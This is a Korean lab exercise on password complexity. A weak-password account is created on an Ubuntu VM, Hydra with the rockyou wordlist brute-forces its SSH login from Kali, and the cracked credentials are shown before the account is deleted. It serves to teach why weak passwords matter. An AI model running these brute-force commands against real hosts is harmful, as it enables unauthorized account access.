## 패스워드 복잡성 설정

취약한 패스워드를 허용하면 어떤 문제가 발생할 수 있는지 알아봅시다.

### 실습 1 : SSH를 통한 사전 대입 공격
1. [우분투] 사용자명이 `aaa`고 패스워드가 `111111`인 계정 생성(또는 기존 계정의 패스워드를 `111111`으로 변경)
```
cju@wooam:~$ sudo adduser aaa
```

2. [칼리] Hydra 도구를 사용한 사전 대입 공격
```
$ hydra -l aaa -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.202.xxx
```

3. [칼리] 패스워드가 보인다!
```
[22][ssh] host: 192.168.202.128   login: aaa   password: 111111
```

4. [칼리] (참고) 사전 파일 확인
```
$ vi /usr/share/wordlists/rockyou.txt.gz
```

### 복구
1. 생성한 계정 삭제
```
cju@wooam:~$ sudo deluser --remove-all-files aaa
```